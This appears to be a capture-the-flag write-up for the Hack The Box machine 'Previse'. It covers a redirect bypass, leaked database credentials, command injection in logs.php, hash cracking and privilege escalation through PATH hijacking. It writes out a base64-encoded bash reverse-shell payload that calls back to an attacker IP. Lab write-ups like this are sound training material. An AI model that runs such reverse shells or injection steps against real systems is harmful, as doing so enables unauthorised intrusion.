---
layout: default
title: Previse
permalink: /writeup/previse/
lang: en
---

<img src="./img/previse.png"  width="650"/>

Previse is a Linux machine. The IP of the box is 10.10.11.104.

# Recon

I starting with *nmap* scan `nmap -A -T4 -oA nmap/previse 10.10.11.104`

<img src="./img/nmap.png"  width="650"/>


And I found two services:
- *ssh*
- *webserver Apache*

On the web page there is a login page.

<img src="./img/login.png"  width="650"/>

After web enum i  find several pages:

<img src="./img/enum.png"  width="650"/>

Start to navigate on `nav.php`  

<img src="./img/nav.png"  width="650"/>

and i intercept the request for `accounts.php` and  try to change the status code from 302 to 200.


<img src="./img/request.png"  width="650"/>

and got the following page


<img src="./img/account_create.png"  width="650"/>

and now can create an account.

# User

In the page `file.php`  there is a zip with a backup of site.

<img src="./img/download.png"  width="650"/>

So i downloaded `SITEBACKUP.ZIP` and started to search for useful information, and i found a db credentials in `config.php`

<img src="./img/config.png"  width="650"/>


and in `logs.php` found a potential RCE

<img src="./img/log.png"  width="650"/>

So i tested the RCE

<img src="./img/test.png"  width="650"/>

and so prepared a payload for a rev shell

`echo "bash -c 'exec bash -i &>/dev/tcp/10.10.14.195/9090 <&1'" | base64`

`echo "YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuMTk1LzkwOTAgPCYxJwo=" | base64 -d | bash`

and encode in url



<img src="./img/rev.png"  width="650"/>

and got it.

Now i have a shell as `www-data`

<img src="./img/user.png"  width="650"/>

access to db with credentials retrieved before (root:mySQL_p@ssw0rd!:) credentials from config.php) and dumped the users.

<img src="./img/dump.png"  width="650"/>

Cracked the hash for the user `m4lwhere` with hashcat

<img src="./img/hashcat.png"  width="650"/>

login as `m4lwhere` and got user flag.

<img src="./img/userflag.png"  width="650"/>



# Root

Now i launch `sudo -l`

<img src="./img/sudo-l.png"  width="650"/>

and found that is possibile execute the script `access_backup.sh`

```bash
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

The script is vulnerable to $PATH manipulation for `gzip` and `data`.

So i create a file called `data` with a rev shell, added in $PATH and execute `access_backup.sh`

<img src="./img/root.png"  width="650"/>

and grab flag

<img src="./img/rootflag.png"  width="650"/>



<img src="./img/previsepwn.png"  width="650"/>
